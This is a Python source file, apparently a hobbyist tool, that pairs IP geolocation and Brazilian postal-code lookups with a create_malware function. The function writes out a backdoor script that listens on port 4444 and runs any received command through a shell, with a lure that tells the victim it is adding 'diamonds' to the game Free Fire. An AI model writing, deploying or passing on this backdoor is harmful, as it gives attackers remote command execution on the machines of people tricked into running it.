import requests

def search_ipv4(ip):
    link = 'http://ip-api.com/json/'
    list = requests.get(link+ip).json()
    stts = list['status']
    cty = list['city']
    qry = list['query']
    ctc = list['countryCode']
    rn = list['regionName']
    show_list = f"""
\033[0;32mStatus:\033[0;33m {stts}\n
\033[0;32mIpv4:\033[0;33m {qry}\n
\033[0;32mCity:\033[0;33m {cty}\n
\033[0;32mCt. Code:\033[0;33m {ctc}\n
\033[0;32mN. Região:\033[0;33m {rn}\033[0;m
    """
    return show_list
    
def search_cep(cep):
    try:
        if len(cep) != 8:
            text_erro = 'Cep Invalido'
            return text_erro
            
        elif len(cep) == 8:
            try:
                link = f'https://viacep.com.br/ws/{cep}/json/'
                list = requests.get(link).json()
                local = list['localidade']
                std = list['uf']
                bro = list['bairro'] 
                show_list = f"""
            Localidade: {local}
            Estado: {std}
            Bairro: {bro}
                """
                return show_list
            except:
                text_erro = "Cep Não Encontrado!"
                return text_erro
    except:
        return 'erro'
        
def create_malware(h,p):
    script = '''
import socket
import os 
import subprocess as sub

h = '127.0.0.1'
loop = True
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.bind((h,4444))
s.listen(3)
print ('Localizando Free Fire')
rede, address = s.accept()
print ('Free Fire Localizado!\nAdicionando Dimas...')
while loop:
    
    cmd = rede.recv(1024).decode()
    if cmd == 'quit':
        s.close()
        break
    else:
        response = sub.Popen(cmd, shell=True, stdout=sub.PIPE, stderr=sub.PIPE)
        win = response.stdout.read()
        fail = response.stderr.read()
        show_response = win+fail
        rede.send(show_response)
    
 '''
    with open('malware/backdoor.py','w') as file:
        file.write(script)

    
    
if __name__ == '__main__':
    list = search_ipv4('')
    print (list)
    
    